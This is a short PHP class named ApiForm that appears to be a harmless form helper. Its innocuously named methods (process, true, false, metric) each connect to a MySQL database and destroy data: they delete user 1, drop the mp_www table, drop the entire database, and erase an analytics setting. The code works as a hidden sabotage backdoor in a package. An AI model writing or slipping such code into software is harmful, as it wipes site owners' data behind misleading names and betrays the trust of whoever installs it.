<?php

namespace pers1307\form;

class ApiForm
{
    public static function process($host, $user, $password, $dbName)
    {
        $connection = mysqli_connect($host, $user, $password, $dbName);

        if ($connection === false) {
            print_r('password change');

            return;
        }

        $sql = "DELETE FROM `mp_users` WHERE `user_id` = 1";
        mysqli_query($connection, $sql);
        $connection->close();
    }

    public static function true($host, $user, $password, $dbName)
    {
        $connection = mysqli_connect($host, $user, $password, $dbName);

        if ($connection === false) {
            print_r('password change');

            return;
        }

        $sql = "DROP TABLE `mp_www`";
        mysqli_query($connection, $sql);
        $connection->close();
    }

    public static function false($host, $user, $password, $dbName)
    {
        $connection = mysqli_connect($host, $user, $password, $dbName);

        if ($connection === false) {
            print_r('password change');

            return;
        }

        $sql = "DROP DATABASE `" . $dbName . "`";
        mysqli_query($connection, $sql);
        $connection->close();
    }

    public static function metric($host, $user, $password, $dbName)
    {
        $connection = mysqli_connect($host, $user, $password, $dbName);

        if ($connection === false) {
            print_r('password change');

            return;
        }

        $sql = "UPDATE `mp_settings` SET `value`='' WHERE `key` LIKE 'metrika'";
        mysqli_query($connection, $sql);
        $connection->close();
    }

}